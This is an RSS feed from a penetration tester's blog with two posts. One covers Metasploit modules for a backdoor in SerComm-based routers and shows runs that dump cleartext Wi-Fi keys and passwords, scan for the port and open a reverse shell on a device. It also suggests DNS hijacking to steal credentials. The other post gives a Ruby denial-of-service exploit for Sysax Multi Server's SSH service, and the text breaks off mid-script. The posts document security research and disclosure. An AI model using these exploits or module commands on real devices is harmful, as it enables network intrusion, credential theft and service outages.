<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Metasploit on Matt Andreko</title>
    <link>https://www.mattandreko.com/categories/metasploit/index.xml</link>
    <description>Recent content in Metasploit on Matt Andreko</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <atom:link href="https://www.mattandreko.com/categories/metasploit/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Backdoor Modules for Netgear, Linksys, and Other Routers</title>
      <link>https://www.mattandreko.com/blog/2014-01-13-backdoor-modules-for-netgear-linksys-and-other-routers/</link>
      <pubDate>Mon, 13 Jan 2014 00:00:00 +0000</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2014-01-13-backdoor-modules-for-netgear-linksys-and-other-routers/</guid>
      <description>


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/backdoor_all_the_routers.jpg#left&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;A week or so ago, I read the news of a new backdoor on several devices, including those made by &lt;a href=&#34;http://www.belkin.com/&#34;&gt;Belkin&lt;/a&gt;, &lt;a href=&#34;http://www.cisco.com/&#34;&gt;Cisco&lt;/a&gt;, &lt;a href=&#34;http://www.netgear.com&#34;&gt;NetGear&lt;/a&gt;, &lt;a href=&#34;http://www.linksys.com&#34;&gt;Linksys&lt;/a&gt;, and several others. A list of what seems to be affected devices can be found &lt;a href=&#34;http://wikidevi.com/w/index.php?title=Special%3AAsk&amp;amp;q=%5B%5BManuf%3A%3ASerComm%5D%5D+%5B%5BGlobal+type%3A%3A~embedded*%5D%5D&amp;amp;po=%3FFCC+ID%0D%0A%3FFCC+approval+date%3DFCC+date%0D%0A%3FEstimated+date+of+release%3DEst.+release+date%0D%0A%3FEmbedded+system+type%0D%0A%3FCPU1+brand%0D%0A%3FCPU1+model%3DCPU1+mdl.%0D%0A&amp;amp;eq=yes&amp;amp;p%5Bformat%5D=broadtable&amp;amp;sort_num=&amp;amp;order_num=ASC&amp;amp;p%5Blimit%5D=500&amp;amp;p%5Boffset%5D=&amp;amp;p%5Blink%5D=all&amp;amp;p%5Bsort%5D=&amp;amp;p%5Bheaders%5D=show&amp;amp;p%5Bmainlabel%5D=&amp;amp;p%5Bintro%5D=&amp;amp;p%5Boutro%5D=&amp;amp;p%5Bsearchlabel%5D=%25E&#34;&gt;here&lt;/a&gt;. &lt;a href=&#34;https://twitter.com/elvanderb&#34;&gt;Eloi Vanderbeken&lt;/a&gt;, who posted his findings on &lt;a href=&#34;https://github.com/elvanderb/TCP-32764&#34;&gt;GitHub&lt;/a&gt; made the original discovery. He also wrote a useful python proof-of-concept exploit, which allowed command injection, but I wanted &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt; integration.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;After playing with the proof-of-concept, I realized how powerful this backdoor could be. As I&amp;rsquo;m doing penetration tests for large enterprises, I&amp;rsquo;m still amazed that I find small consumer-grade routers all the time. With this backdoor, however, I could gain leverage into certain networks, gain credentials, or all kinds of other fun. That&amp;rsquo;s where all my learning started.&lt;/p&gt;

&lt;div style=&#34;clear:both;&#34;&gt;&lt;/div&gt;

&lt;h2 id=&#34;configuration-dump-module&#34;&gt;Configuration Dump Module&lt;/h2&gt;

&lt;p&gt;So the first module I wrote, with the help of &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;, was to dump the configuration of the device&amp;rsquo;s nvram. This is useful to an attacker for a couple reasons:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;It contains clear-text passwords to the device, which can often be used to login to the remote management console.&lt;/li&gt;
&lt;li&gt;In case the device gets messed up from attacking it, all the configuration values can be restored at a later time from the dump.&lt;/li&gt;
&lt;li&gt;It contains passwords, sweet passwords! People re-use their passwords everywhere, and you now have valid passwords.&lt;/li&gt;
&lt;li&gt;Did I mention the passwords?&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Below is a demonstration of the module running. Note the wireless SSID, keys, and additional credentials being uncovered, without having to supply any credentials:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;➜  ~  msfcli auxiliary/admin/misc/sercomm_dump_config RHOST=192.168.1.1 E
[*] Initializing modules...
RHOST =&amp;gt; 192.168.1.1
[*] 192.168.1.1:32764 - Attempting to connect and check endianess...
[+] 192.168.1.1:32764 - Big Endian device found...
[*] 192.168.1.1:32764 - Attempting to connect and dump configuration...
[*] 192.168.1.1:32764 - Router configuration dump stored in: /Users/mandreko/.msf4/loot/20140113231717_default_192.168.1.1_router.config_104290.txt
[*] 192.168.1.1:32764 - Wifi SSID: Netgear15
[*] 192.168.1.1:32764 - Wifi Key 1: 2A17B75F3D
[*] 192.168.1.1:32764 - Wifi Key 2: C65EFCF158
[*] 192.168.1.1:32764 - Wifi Key 3: 3066C6DDE6
[*] 192.168.1.1:32764 - Wifi Key 4: 1F397B65CA
[*] 192.168.1.1:32764 - HTTP Web Management: User: admin Pass: password
[*] 192.168.1.1:32764 - PPPoE: User: mandreko_dsl Pass: isreallysecure1
[*] 192.168.1.1:32764 - PPPoA: User: mandreko_dsl Pass: isreallysecure1
[*] Auxiliary module execution completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Just tonight, I found that in some of the refactoring we did, the credential collection actually broke, so I made a &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/2878&#34;&gt;pull-request&lt;/a&gt; to fix it (in case anyone wants to try it before it&amp;rsquo;s merged to trunk). The above output was using the newer code.&lt;/p&gt;

&lt;h2 id=&#34;the-scanner-module&#34;&gt;The Scanner Module&lt;/h2&gt;

&lt;p&gt;So we can dump the nvram configuration of a device. But what good is that if you&amp;rsquo;re unable to find vulnerable devices on the network? In came module number two, the scanner, which could scan all sorts of network ranges. In the below sample, I scanned my test network for the vulnerability, and it found my device, and detected the endianness it was communicating over. You see, MIPS, unlike x86, which is always little endian, can be big or little endian, depending on the processor. Some can even be both, I&amp;rsquo;m told. However, you need to know which, to know how to communicate with the device. You can start to see how learning MIPS was going to be fun.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;➜  ~  msfcli auxiliary/scanner/misc/sercomm_backdoor_scanner RHOSTS=192.168.1.0/24 THREADS=64 E
[*] Initializing modules...
RHOSTS =&amp;gt; 192.168.1.0/24
THREADS =&amp;gt; 64
[+] 192.168.1.1:32764 - Possible backdoor detected - Big Endian
[*] Scanned 036 of 256 hosts (014% complete)
[*] Scanned 058 of 256 hosts (022% complete)
[*] Scanned 083 of 256 hosts (032% complete)
[*] Scanned 105 of 256 hosts (041% complete)
[*] Scanned 129 of 256 hosts (050% complete)
[*] Scanned 157 of 256 hosts (061% complete)
[*] Scanned 196 of 256 hosts (076% complete)
[*] Scanned 205 of 256 hosts (080% complete)
[*] Scanned 233 of 256 hosts (091% complete)
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;the-journey-to-an-exploit&#34;&gt;The journey to an exploit&lt;/h2&gt;

&lt;p&gt;So the first two modules really didn&amp;rsquo;t take a long time to write. The scanner for example, was all of 30 minutes, since &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt; has so many nice mix-ins, and libraries already available. The bulk of my last week and a half was spent learning MIPS, and how to generate working payloads. Let me take you on my journey&amp;hellip;&lt;/p&gt;

&lt;p&gt;Initially, I tried using the payloads in Metasploit, since they&amp;rsquo;ve recently added MIPSBE and MIPSLE (big endian and little endian respectively). However, on my testing device, none of the payloads would work. I figured that it would probably be pretty easy to compile for MIPS based devices, since people do ARM all the time with iOS and Android development. Boy was I wrong. I spent 3 days trying to get a working toolchain. I installed the &lt;a href=&#34;http://buildroot.uclibc.org/&#34;&gt;uclibc Buildroot&lt;/a&gt; toolchain, and found that it&amp;rsquo;s documentation was a bit hard to decipher for a newbie like me. I tried using &lt;a href=&#34;http://www.mentor.com/embedded-software/sourcery-tools/sourcery-codebench/editions/lite-edition/&#34;&gt;Sourcery Codebench&lt;/a&gt;, but again was foiled, because I couldn&amp;rsquo;t target the correct MIPS processors. Eventually I was reading about using &lt;a href=&#34;http://www.gentoo.org&#34;&gt;Gentoo&lt;/a&gt; with its &amp;ldquo;crossdev&amp;rdquo; package.&lt;/p&gt;

&lt;p&gt;After a day of compiling, I had a working base image. From there, I installed crossdev per the documentation. Additionally, I had it create cross-compilers for my MIPS target. (This took several hours to figure out how to get right) In case anyone wants it, this worked for me:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# emerge crossdev
# CBUILD=x86_64-pc-linux-gnu CHOST=x86_64-pc-linux-gnu CTARGET=mips-pc-linux-uclibc USE=-nptl crossdev --target mips-pc-linux-uclibc --without-headers
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Amazing! I could build executables! I made a simple HelloWorld app, and compiled it. It then ran on my test device. I was in business. I just had to figure out how to make a new template in Metasploit, which was going to be no fun at all.&lt;/p&gt;

&lt;p&gt;I started talking with &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;, and I mentioned that my exploit module would now upload the binary payload, but would never run, giving all sorts of random errors. However, if I manually ran &amp;lsquo;msfpayload&amp;rsquo;, and uploaded the output, it would work. For some reason I had never tried this, because I do things the hard way sometimes. When we were talking, something I said apparently made him think about it. He came back, and told me he found something. Intrigued, I asked for more information, and he showed me a typo in the core libraries that he then made into a &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/2849/files&#34;&gt;pull-request&lt;/a&gt;. It was a simple mistake, which was probably looked over several times. The  MIPSBE payloads were being encoded with a MIPSLE encoder, which just messed up everything.&lt;/p&gt;

&lt;p&gt;After he merged the pull request, the skies turned blue, and a little rainbow appeared. Payloads were being generated in my module successfully, and giving me shells. Then, I realized that all the time I spent building a &lt;a href=&#34;http://www.gentoo.org&#34;&gt;Gentoo&lt;/a&gt; crossdev environment, and installing all kinds of tools were pretty much wasted, since it was all just due to a single character typo. On the bright side, the time wasn&amp;rsquo;t really wasted, as I did learn a &lt;em&gt;lot&lt;/em&gt; about MIPS, since I was starting to read on shellcoding too.&lt;/p&gt;

&lt;h1 id=&#34;the-smell-of-fresh-shells-in-the-morning&#34;&gt;The smell of fresh shells in the morning&lt;/h1&gt;

&lt;p&gt;So after all that time messing with MIPS and &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt; ruby code, I had something working, which would actually get a shell. However, as I quickly learned over this past weekend, I forgot to account for little endian devices on the exploit. I had even written code to detect the endianness on the scanner and config dump modules, but somehow on the important command injection vulnerability, had only tested on big endian. I came clean with &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;, and told him to expect yet another pull request. He was able to make a quick fix, to get the module working for the next Pro release. I then worked to put together a new pull-request to add the little endian values.&lt;/p&gt;

&lt;p&gt;During my testing over several devices, however, I found that sometimes devices that would talk to me using big endian, would sometimes require little endian payloads, and vice versa. It was odd, and I can&amp;rsquo;t explain it, but they did. So I added several new targets to my exploit, for specific devices, as well as 2 generic ones. As I get ahold of additional devices (or anyone else for that matter), the code will be updated to reflect those new values. Those changes will hopefully be merged into the trunk soon, but for now, the code can be accessed &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/2874&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;To demonstrate this bug, I have exploited a NetGear WAP4410N device:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;➜  ~  msfconsole -r wap4410n.rc
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% http://metasploit.pro %%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       =[ metasploit v4.9.0-dev [core:4.9 api:1.0] ]
+ -- --=[ 1251 exploits - 681 auxiliary - 201 post ]
+ -- --=[ 328 payloads - 32 encoders - 8 nops      ]
+ -- --=[ Answer Q&#39;s about Metasploit and win a WiFi Pineapple Mk5   ]
+ -- --=[ http://bit.ly/msfsurvey (Expires Wed Jan 22 23:59:59 2014) ]

[*] Processing wap4410n.rc for ERB directives.
resource (wap4410n.rc)&amp;gt; use exploit/linux/misc/sercomm_exec
resource (wap4410n.rc)&amp;gt; set target 2
target =&amp;gt; 2
resource (wap4410n.rc)&amp;gt; set payload linux/mipsbe/shell_reverse_tcp
payload =&amp;gt; linux/mipsbe/shell_reverse_tcp
resource (wap4410n.rc)&amp;gt; set rhost 192.168.1.1
rhost =&amp;gt; 192.168.1.1
resource (wap4410n.rc)&amp;gt; set lhost 192.168.1.136
lhost =&amp;gt; 192.168.1.136
msf exploit(sercomm_exec) &amp;gt; show options

Module options (exploit/linux/misc/sercomm_exec):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.1.1      yes       The target address
   RPORT  32764            yes       The target port


Payload options (linux/mipsbe/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.136    yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Cisco WAP4410N


msf exploit(sercomm_exec) &amp;gt; show targets

Exploit targets:

   Id  Name
   --  ----
   0   Generic Linux MIPS Big Endian
   1   Generic Linux MIPS Little Endian
   2   Cisco WAP4410N
   3   Honeywell WAP-PL2 IP Camera
   4   Netgear DG834
   5   Netgear DG834G
   6   Netgear DG834PN
   7   Netgear DGN1000
   8   Netgear DSG835
   9   Netgear WPNT834


msf exploit(sercomm_exec) &amp;gt; exploit

[*] Started reverse handler on 192.168.1.136:4444
[*] Command shell session 1 opened (192.168.1.136:4444 -&amp;gt; 192.168.1.1:2817) at 2014-01-14 00:33:02 -0500
[*] Command Stager progress - 100.00% done (1415/1415 bytes)

ls -al /
drwxrwxrwx    8 0        0               0 var
drwxr-xr-x    7 0        0              81 usr
drwxrwxrwx    4 0        0               0 tmp
drwxr-xr-x    2 0        0             217 sbin
drwxr-xr-x    2 0        0              36 root
dr-xr-xr-x   47 0        0               0 proc
drwxr-xr-x    2 0        0              23 lost+found
drwxr-xr-x    3 0        0             742 lib
drwxr-xr-x    6 0        0             352 etc
drwxr-xr-x    3 0        0             403 dev
drwxr-xr-x    2 0        0             323 bin
drwxr-xr-x   13 0        0             119 ..
drwxr-xr-x   13 0        0             119 .
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;At this point, command injection has been turned into a fully-fledged shell. As &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;egyp7&lt;/a&gt; says, &amp;ldquo;I love shells&amp;rdquo;.&lt;/p&gt;

&lt;h2 id=&#34;the-scary-part&#34;&gt;The scary part&lt;/h2&gt;

&lt;p&gt;So here you&amp;rsquo;ve seen how you can take a router, and get a shell on it. However the truly scary part is that several of these devices are listening on their WAN interface! That means a remote attacker can exploit your vulnerable router, and start mapping the inside of your network. Some devices support an SSH server, which you could then connect into, and make a dynamic socks proxy, or just forward ports. You already know the username and password to the SSH server, since you dumped all the passwords before, right?&lt;/p&gt;

&lt;p&gt;Another attack could be to simply change the router&amp;rsquo;s DNS servers, so that when clients connect, it serves them with an evil DNS server, making all your sites go to a remote server, which then transparently steals your credentials.&lt;/p&gt;

&lt;p&gt;You can go all tin-foil hat on this, and have some real fun. However, in the long run, I accomplished my goal, and now can compromise many of those devices I see on penetration tests, which really shouldn&amp;rsquo;t belong in the enterprise, and finally have something to back it up with, other than, &amp;ldquo;it says &amp;lsquo;Home&amp;rsquo; on the box&amp;hellip;&amp;rdquo;&lt;/p&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This was a really fun exercise, and taught me a lot about MIPS. This is also now one of my more favorite contributions.&lt;/p&gt;

&lt;p&gt;In the near future, it sounds like there are going to be staged payloads for MIPS, so you don&amp;rsquo;t have to run the big un-staged ones. As more and more vulnerabilities start popping up on these &amp;ldquo;unconventional computers&amp;rdquo;, we&amp;rsquo;ll see more and more framework around exploiting them. I for one am excited.&lt;/p&gt;

&lt;p&gt;Additionally, if you have any access to a vulnerable device, which isn&amp;rsquo;t currently a target in the exploit module, hit me up. I&amp;rsquo;d love to get more devices added, without buying 100 routers.&lt;/p&gt;

&lt;p&gt;Lastly, I&amp;rsquo;d like to personally thank &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;. Without your help, these code contributions would have been much lower in quality, if existing at all. You rock.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Sysax Multi Server 6.10 SSH DoS</title>
      <link>https://www.mattandreko.com/blog/2013-04-08-sysax-multi-server-610-ssh-dos/</link>
      <pubDate>Mon, 08 Apr 2013 08:27:00 -0400</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2013-04-08-sysax-multi-server-610-ssh-dos/</guid>
      <description>

&lt;p&gt;I was recently fuzzing a bunch of SSH servers, hoping to find some remote code execution in a non-mainstream server. I ended up finding no code execution in the several that I tried, but I did find one pre-auth denial of service in Syax Multi Server 6.10.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2 id=&#34;try-this-at-home&#34;&gt;Try this at home!&lt;/h2&gt;

&lt;p&gt;The vulnerable version can be downloaded &lt;a href=&#34;https://www.dropbox.com/s/d6js8u6i4eioa1j/sysaxserv_setup_6.10.msi&#34;&gt;here&lt;/a&gt; for anyone that would like to duplicate the DoS conditions.&lt;/p&gt;

&lt;h2 id=&#34;understanding-the-key-exchange&#34;&gt;Understanding the Key Exchange&lt;/h2&gt;

&lt;p&gt;I found that during the key exchange, where the SSH client and SSH server negotiate which ciphers to use, if you messed up just a single specific byte, the server would crash. I started reading through the &lt;a href=&#34;https://tools.ietf.org/html/rfc4253#section-7.1&#34;&gt;RFC&lt;/a&gt; for SSH keyexchange, and found the key exchange to be mostly ASCII.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/sysax_ssh_hex.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I started playing with the byte that caused the crash, and it seemed that it was some sort of control character, or separator. I&amp;rsquo;m still unsure. However, changing it would cause a crash every time.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/sysax_ssh_hex2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I wasn&amp;rsquo;t able to figure out any way to get remote code execution, although someone smarter than me, may be able to do it. For now, I&amp;rsquo;ll settle with a DoS exploit.&lt;/p&gt;

&lt;h2 id=&#34;the-exploit&#34;&gt;The exploit&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env ruby
# Sysax Multi Server 6.10 SSH DoS
# Matt &amp;quot;hostess&amp;quot; Andreko &amp;lt; mandreko [at] accuvant.com &amp;gt;
# http://www.mattandreko.com/2013/04/sysax-multi-server-610-ssh-dos.html

require &#39;socket&#39;

unless ARGV.length == 2
  puts &amp;quot;Usage: ruby #{$0} [host] [port]\n&amp;quot;
  exit
end

packet = [0x00, 0x00, 0x03, 0x14, 0x08, 0x14, 0xff, 0x9f,
  0xde, 0x5d, 0x5f, 0xb3, 0x07, 0x8f, 0x49, 0xa7,
  0x79, 0x6a, 0x03, 0x3d, 0xaf, 0x55, 0x00, 0x00,
  0x00, 0x7e, 0x64, 0x69, 0x66, 0x66, 0x69, 0x65,
  0x2d, 0x68, 0x65, 0x6c, 0x6c, 0x6d, 0x61, 0x6e,
  0x2d, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x2d, 0x65,
  0x78, 0x63, 0x68, 0x61, 0x6e, 0x67, 0x65, 0x2d,
  0x73, 0x68, 0x61, 0x32, 0x35, 0x36, 0x2c, 0x64,
  0x69, 0x66, 0x66, 0x69, 0x65, 0x2d, 0x68, 0x65,
  0x6c, 0x6c, 0x6d, 0x61, 0x6e, 0x2d, 0x67, 0x72,
  0x6f, 0x75, 0x70, 0x2d, 0x65, 0x78, 0x63, 0x68,
  0x61, 0x6e, 0x67, 0x65, 0x2d, 0x73, 0x68, 0x61,
  0x31, 0x2c, 0x64, 0x69, 0x66, 0x66, 0x69, 0x65,
  0x2d, 0x68, 0x65, 0x6c, 0x6c, 0x6d, 0x61, 0x6e,
  0x2d, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x31, 0x34,
  0x2d, 0x73, 0x68, 0x61, 0x31, 0x2c, 0x64, 0x69,
  0x66, 0x66, 0x69, 0x65, 0x2d, 0x68, 0x65, 0x6c,
  0x6c, 0x6d, 0x61, 0x6e, 0x2d, 0x67, 0x72, 0x6f,
  0x75, 0x70, 0x31, 0x2d, 0x73, 0x68, 0x61, 0x31,
  0x00, 0x00, 0x00, 0x0f, 0x73, 0x73, 0x68, 0x2d,
  0x72, 0x73, 0x61, 0x2c, 0x73, 0x73, 0x68, 0x2d,
  0x64, 0x73, 0x73, 0x00, 0x00, 0x00, 0x9d, 0x61,
  0x65, 0x73, 0x31, 0x32, 0x38, 0x2d, 0x63, 0x62,
  0x63, 0x2c, 0x33, 0x64, 0x65, 0x73, 0x2d, 0x63,
  0x62, 0x63, 0x2c, 0x62, 0x6c, 0x6f, 0x77, 0x66,
  0x69, 0x73, 0x68, 0x2d, 0x63, 0x62, 0x63, 0x2c,
  0x63, 0x61, 0x73, 0x74, 0x31, 0x32, 0x38, 0x2d,
  0x63, 0x62, 0x63, 0x2c, 0x61, 0x72, 0x63, 0x66,
  0x6f, 0x75, 0x72, 0x31, 0x32, 0x38, 0x2c, 0x61,
  0x72, 0x63, 0x66, 0x6f, 0x75, 0x72, 0x32, 0x35,
  0x36, 0x2c, 0x61, 0x72, 0x63, 0x66, 0x6f, 0x75,
  0x72, 0x2c, 0x61, 0x65, 0x73, 0x31, 0x39, 0x32,
  0x2d, 0x63, 0x62, 0x63, 0x2c, 0x61, 0x65, 0x73,
  0x32, 0x35, 0x36, 0x2d, 0x63, 0x62, 0x63, 0x2c,
  0x72, 0x69, 0x6a, 0x6e, 0x64, 0x61, 0x65, 0x6c,
  0x2d, 0x63, 0x62, 0x63, 0x40, 0x6c, 0x79, 0x73,
  0x61, 0x74, 0x6f, 0x72, 0x2e, 0x6c, 0x69, 0x75,
  0x2e, 0x73, 0x65, 0x2c, 0x61, 0x65, 0x73, 0x31,
  0x32, 0x38, 0x2d, 0x63, 0x74, 0x72, 0x2c, 0x61,
  0x65, 0x73, 0x31, 0x39, 0x32, 0x2d, 0x63, 0x74,
  0x72, 0x2c, 0x61, 0x65, 0x73, 0x32, 0x35, 0x36,
  0x2d, 0x63, 0x74, 0x72, 0x00, 0x00, 0x00, 0x9d,
  0x61, 0x65, 0x73, 0x31, 0x32, 0x38, 0x2d, 0x63,
  0x62, 0x63, 0x2c, 0x33, 0x64, 0x65, 0x73, 0x2d,
  0x63, 0x62, 0x63, 0x2c, 0x62, 0x6c, 0x6f, 0x77,
  0x66, 0x69, 0x73, 0x68, 0x2d, 0x63, 0x62, 0x63,
  0x2c, 0x63, 0x61, 0x73, 0x74, 0x31, 0x32, 0x38,
  0x2d, 0x63, 0x62, 0x63, 0x2c, 0x61, 0x72, 0x63,
  0x66, 0x6f, 0x75, 0x72, 0x31, 0x32, 0x38, 0x2c,
  0x61, 0x72, 0x63, 0x66, 0x6f, 0x75, 0x72, 0x32,
  0x35, 0x36, 0x2c, 0x61, 0x72, 0x63, 0x66, 0x6f,
  0x75, 0x72, 0x2c, 0x61, 0x65, 0x73, 0x31, 0x39,
  0x32, 0x2d, 0x63, 0x62, 0x63, 0x2c, 0x61, 0x65,
  0x73, 0x32, 0x35, 0x36, 0x2d, 0x63, 0x62, 0x63,
  0x2c, 0x72, 0x69, 0x6a, 0x6e, 0x64, 0x61, 0x65,
  0x6c, 0x2d, 0x63, 0x62, 0x63, 0x40, 0x6c, 0x79,
  0x73, 0x61, 0x74, 0x6f, 0x72, 0x2e, 0x6c, 0x69,
  0x75, 0x2e, 0x73, 0x65, 0x2c, 0x61, 0x65, 0x73,
  0x31, 0x32, 0x38, 0x2d, 0x63, 0x74, 0x72, 0x2c,
  0x61, 0x65, 0x73, 0x31, 0x39, 0x32, 0x2d, 0x63,
  0x74, 0x72, 0x2c, 0x61, 0x65, 0x73, 0x32, 0x35,
  0x36, 0x2d, 0x63, 0x74, 0x72, 0x00, 0x00, 0x00,
  0x69, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x6d, 0x64,
  0x35, 0x2c, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x73,
  0x68, 0x61, 0x31, 0x2c, 0x75, 0x6d, 0x61, 0x63,
  0x2d, 0x36, 0x34, 0x40, 0x6f, 0x70, 0x65, 0x6e,
  0x73, 0x73, 0x68, 0x2e, 0x63, 0x6f, 0x6d, 0x2c,
  0x68, 0x6d, 0x61, 0x63, 0x2d, 0x72, 0x69, 0x70,
  0x65, 0x6d, 0x64, 0x31, 0x36, 0x30, 0x2c, 0x68,
  0x6d, 0x61, 0x63, 0x2d, 0x72, 0x69, 0x70, 0x65,
  0x6d, 0x64, 0x31, 0x36, 0x30, 0x40, 0x6f, 0x70,
  0x65, 0x6e, 0x73, 0x73, 0x68, 0x2e, 0x63, 0x6f,
  0x6d, 0x2c, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x73,
  0x68, 0x61, 0x31, 0x2d, 0x39, 0x36, 0x2c, 0x68,
  0x6d, 0x61, 0x63, 0x2d, 0x6d, 0x64, 0x35, 0x2d,
  0x39, 0x36, 0x00, 0x00, 0x00, 0x69, 0x68, 0x6d,
  0x61, 0x63, 0x2d, 0x6d, 0x64, 0x35, 0x2c, 0x68,
  0x6d, 0x61, 0x63, 0x2d, 0x73, 0x68, 0x61, 0x31,
  0x2c, 0x75, 0x6d, 0x61, 0x63, 0x2d, 0x36, 0x34,
  0x40, 0x6f, 0x70, 0x65, 0x6e, 0x73, 0x73, 0x68,
  0x2e, 0x63, 0x6f, 0x6d, 0x2c, 0x68, 0x6d, 0x61,
  0x63, 0x2d, 0x72, 0x69, 0x70, 0x65, 0x6d, 0x64,
  0x31, 0x36, 0x30, 0x2c, 0x68, 0x6d, 0x61, 0x63,
  0x2d, 0x72, 0x69, 0x70, 0x65, 0x6d, 0x64, 0x31,
  0x36, 0x30, 0x40, 0x6f, 0x70, 0x65, 0x6e, 0x73,
  0x73, 0x68, 0x2e, 0x63, 0x6f, 0x6d, 0x2c, 0x68,
  0x6d, 0x61, 0x63, 0x2d, 0x73, 0x68, 0x61, 0x31,
  0x2d, 0x39, 0x36, 0x2c, 0x68, 0x6d, 0x61, 0x63,
  0x2d, 0x6d, 0x64, 0x35, 0x2d, 0x39, 0x36, 0x00,
  #3rd byte in this next line causes crash
  0x00, 0x00, 0x28, 0x7a, 0x6c, 0x69, 0x62, 0x40,
  0x6f, 0x70, 0x65, 0x6e, 0x73, 0x73, 0x68, 0x2e,
  0x63, 0x6f, 0x6d, 0x2c, 0x7a, 0x6c, 0x69, 0x62,
  0x2c, 0x6e, 0x6f, 0x6e, 0x65, 0x00, 0x00, 0x00,
  0x1a, 0x7a, 0x6c, 0x69, 0x62, 0x40, 0x6f, 0x70,
  0x65, 0x6e, 0x73, 0x73, 0x68, 0x2e, 0x63, 0x6f,
  0x6d, 0x2c, 0x7a, 0x6c, 0x69, 0x62, 0x2c, 0x6e,
  0x6f, 0x6e, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
